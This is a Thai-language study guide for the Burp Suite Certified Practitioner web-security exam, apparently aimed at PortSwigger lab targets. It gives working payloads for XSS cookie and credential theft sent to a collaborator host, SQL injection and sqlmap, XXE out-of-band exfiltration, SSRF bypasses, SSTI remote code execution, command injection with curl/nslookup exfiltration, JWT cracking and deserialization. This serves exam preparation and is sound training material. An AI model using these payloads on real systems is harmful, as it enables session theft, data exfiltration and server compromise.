# คู่มือเตรียมสอบ Burp Suite Certified Practitioner (BSCP)
> ฉบับภาษาไทย - ปรับจาก [botesjuan's study guide](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study)

---

## รูปแบบการสอบ

| รายละเอียด | ข้อมูล |
|------------|--------|
| **เวลาทั้งหมด** | 4 ชั่วโมง |
| **จำนวนแอป** | 2 แอปพลิเคชัน (แอปละ 2 ชั่วโมง) |
| **เป้าหมายสุดท้าย** | อ่านไฟล์ `/home/carlos/secret` |
| **ผู้ใช้ในระบบ** | มี victim user แค่ 1 คนต่อแอป |

---

## 3 ขั้นตอนหลักของการโจมตี

### Stage 1: Foothold (เข้าระบบครั้งแรก)
**เป้าหมาย:** ได้ session/credentials ของ user ธรรมดา

ช่องโหว่ที่ต้องหา:
- **XSS** (DOM-based, Reflected, Stored) → ขโมย cookie
- **Web Cache Poisoning** → inject payload ผ่าน cache
- **Host Header Injection** → เปลี่ยน link ใน password reset
- **HTTP Request Smuggling** → แทรก request เข้าไปใน queue
- **Authentication Bypass** → brute force, logic flaws

**สิ่งสำคัญ:** Stage 1 มี victim user แค่คนเดียว ถ้าใช้ "Deliver exploit to victim" ไปแล้ว จะใช้อีกไม่ได้ใน stage ถัดไป → เลือกใช้ให้ดี!

---

### Stage 2: Privilege Escalation (ยกระดับสิทธิ์)
**เป้าหมาย:** ได้ session/credentials ของ admin

ช่องโหว่ที่ต้องหา:
- **SQL Injection** → ดึง password จาก database
- **CSRF** → บังคับให้ admin เปลี่ยน email แล้ว reset password
- **JWT Attacks** → algorithm confusion, weak secret
- **Access Control** → IDOR, forced browsing, role manipulation
- **Prototype Pollution** → เปลี่ยน property ของ object
- **OAuth Flaws** → stealing authorization codes

---

### Stage 3: Data Exfiltration (ดึงข้อมูล)
**เป้าหมาย:** อ่านไฟล์ `/home/carlos/secret` ผ่าน admin panel

ช่องโหว่ที่ต้องหา:
- **XXE Injection** → อ่านไฟล์ผ่าน XML parser
- **SSRF** → เข้าถึง internal services
- **SSTI** → Server-Side Template Injection → RCE
- **OS Command Injection** → รันคำสั่งบน server
- **Path Traversal** → `../../../home/carlos/secret`
- **File Upload** → upload web shell
- **Insecure Deserialization** → RCE ผ่าน gadget chains

---

## Payload ที่ต้องจำ

### XSS Cookie Stealer
```javascript
// แบบพื้นฐาน
<script>document.location='https://BURP-COLLABORATOR/?c='+document.cookie</script>

// แบบ fetch (ถ้า document.location ถูก block)
<script>fetch('https://BURP-COLLABORATOR/?c='+document.cookie)</script>

// แบบ img tag (bypass บาง filter)
<img src=x onerror="this.src='https://BURP-COLLABORATOR/?c='+document.cookie">
```

**หมายเหตุ:** Cookie ต้องไม่มี `HttpOnly` flag ถึงจะขโมยได้ ถ้ามี → ต้องเปลี่ยนไป harvest credentials แทน

### XSS Credential Harvester
```javascript
// สร้าง fake login form
<input name=username id=username>
<input type=password name=password onchange="
  fetch('https://BURP-COLLABORATOR',{
    method:'POST',
    mode:'no-cors',
    body:username.value+':'+this.value
  })
">
```

### SQL Injection

```sql
-- ทดสอบว่ามี SQLi ไหม
' OR 1=1--
' AND '1'='1

-- Error-based (เอา data ออกมาผ่าน error message)
' AND CAST((SELECT password FROM users LIMIT 1) AS int)--

-- UNION-based (ต้องหาจำนวน column ก่อน)
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT username,password FROM users--

-- Time-based Blind (PostgreSQL)
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Time-based Blind (MySQL)
' AND SLEEP(5)--

-- Time-based Blind (Oracle)
' AND dbms_pipe.receive_message('a',5)='a
```

**SQLmap command ที่ใช้บ่อย:**
```bash
# บันทึก request จาก Burp → save เป็นไฟล์ req.txt
sqlmap -r req.txt --level=5 --risk=3 --batch

# ระบุ parameter
sqlmap -r req.txt -p "search" --level=5 --risk=3

# dump ข้อมูล
sqlmap -r req.txt --dump -T users
```

### XXE Injection

```xml
<!-- อ่านไฟล์โดยตรง -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///home/carlos/secret">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>

<!-- XInclude (ใช้เมื่อควบคุม XML ได้แค่บางส่วน) -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///home/carlos/secret"/>
</foo>

<!-- Out-of-band exfiltration (ถ้า response ไม่แสดง data) -->
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://BURP-COLLABORATOR/malicious.dtd">
  %xxe;
]>
```

**malicious.dtd บน server:**
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://BURP-COLLABORATOR/?x=%file;'>">
%eval;
%exfil;
```

### SSRF

```
# ทดสอบเบื้องต้น
http://localhost/admin
http://127.0.0.1/admin

# Bypass filter
http://127.1/admin
http://2130706433/admin  (decimal IP)
http://localhost%2523@stock.weliketoshop.net/admin  (double URL encode #)

# Cloud metadata (AWS)
http://169.254.169.254/latest/meta-data/
```

### SSTI (Server-Side Template Injection)

```python
# ทดสอบว่ามี SSTI ไหม
{{7*7}}  # ถ้า output = 49 → มี SSTI

# Jinja2 (Python)
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /home/carlos/secret').read()}}

# Tornado (Python)
{% import os %}{{ os.popen("cat /home/carlos/secret").read() }}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /home/carlos/secret")}

# ERB (Ruby)
<%= system("cat /home/carlos/secret") %>
<%= `cat /home/carlos/secret` %>

# Handlebars (Node.js)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('cat /home/carlos/secret');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### OS Command Injection

```bash
# Basic
; cat /home/carlos/secret
| cat /home/carlos/secret
`cat /home/carlos/secret`
$(cat /home/carlos/secret)

# Blind (ใช้ time delay ทดสอบ)
; sleep 10
| sleep 10

# Out-of-band
; curl https://BURP-COLLABORATOR/$(cat /home/carlos/secret | base64)
; nslookup $(cat /home/carlos/secret).BURP-COLLABORATOR
```

### JWT Attacks

```bash
# None algorithm attack
# เปลี่ยน header เป็น {"alg":"none"} แล้วลบ signature

# Algorithm confusion (RS256 → HS256)
# ใช้ public key เป็น secret key ในการ sign

# Weak secret - crack ด้วย hashcat
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

### Insecure Deserialization

```bash
# PHP - สร้าง serialized object
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}

# Java - ใช้ ysoserial
java -jar ysoserial.jar CommonsCollections4 'cat /home/carlos/secret' | base64
```

---

## Methodology แบบย่อ

### เริ่มต้นทำแอปใหม่

1. **Recon (5-10 นาที)**
   - เปิด Burp → Browse ทั้งแอป → สร้าง sitemap
   - หา hidden endpoints: `/robots.txt`, `/.git`, `/backup`
   - อ่าน source code → หา developer comments
   - เช็ค cookie flags (HttpOnly, Secure, SameSite)

2. **Identify Stage 1 Vector**
   - มี search function? → ทดสอบ XSS
   - มี password reset? → ทดสอบ Host Header Injection
   - มี comment/feedback? → ทดสอบ Stored XSS
   - Response มี `X-Cache: hit`? → ทดสอบ Cache Poisoning

3. **ได้ User Access แล้ว → หา Admin Vector**
   - มี "Update email"? → ทดสอบ CSRF
   - มี advanced search? → ทดสอบ SQLi
   - Cookie มี serialized data? → ทดสอบ Deserialization
   - มี JWT? → ทดสอบ algorithm confusion

4. **ได้ Admin Access แล้ว → หา File Read**
   - Admin panel มี import/export? → ทดสอบ XXE
   - มี fetch URL feature? → ทดสอบ SSRF
   - มี template/rendering? → ทดสอบ SSTI
   - มี file upload? → upload web shell
   - มี input ที่ไปถึง OS? → ทดสอบ Command Injection

---

## Burp Suite Tips

### Targeted Scanning (สำคัญมาก!)
**อย่า scan ทั้งแอป** → เสียเวลา + ผลไม่แม่น

วิธีที่ถูก:
1. หา request ที่น่าสนใจ (มี parameter)
2. คลิกขวา → "Scan defined insertion points"
3. เลือกเฉพาะ parameter ที่ต้องการทดสอบ

### Extensions ที่ต้องมี
- **DOM Invader** → หา DOM XSS
- **JWT Editor** → แก้ไข JWT tokens
- **HTTP Request Smuggler** → ทดสอบ smuggling
- **Java Deserialization Scanner** → หา deser vulns
- **Hackvertor** → encode/decode payloads

### Intruder Attack Types
| Type | ใช้เมื่อ |
|------|---------|
| **Sniper** | Fuzz parameter เดียว |
| **Battering Ram** | ใส่ payload เดียวกันทุก position |
| **Pitchfork** | หลาย wordlist, ใช้คู่กัน (username:password) |
| **Cluster Bomb** | ทุก combination ของ wordlists |

---

## Checklist ก่อนสอบ

- [ ] ทำ Mystery Lab ระดับ Practitioner ได้ 10+ labs โดยไม่ดู hint
- [ ] จำ payload หลักๆ ได้ (XSS, SQLi, XXE, SSTI)
- [ ] ใช้ Burp Collaborator คล่อง
- [ ] รู้วิธี bypass WAF พื้นฐาน (encoding, case change)
- [ ] เข้าใจ 3-stage flow และรู้ว่าช่องโหว่ไหนใช้ stage ไหน
- [ ] มี cheat sheet ของตัวเอง

---

## แหล่งเรียนรู้เพิ่มเติม

- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [BSCP Interactive Checklist](https://bscp.guide)
- [botesjuan's GitHub (English)](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study)
- [DingyShark's Methodology](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner)

---

## คำแนะนำสุดท้าย

> "ความเร็วในการ **identify** ช่องโหว่สำคัญกว่าความเร็วในการ exploit"

- ฝึกจนจำ pattern ได้ → เห็น search box = นึกถึง XSS/SQLi ทันที
- อย่าติดอยู่กับช่องโหว่เดียวนานเกิน 20 นาที → move on แล้วกลับมาทีหลัง
- ใช้ targeted scan เป็นหลัก → full scan = เสียเวลา
- เก็บ Burp Collaborator URL ไว้ใน clipboard ตลอด

**ขอให้โชคดีในการสอบ!**
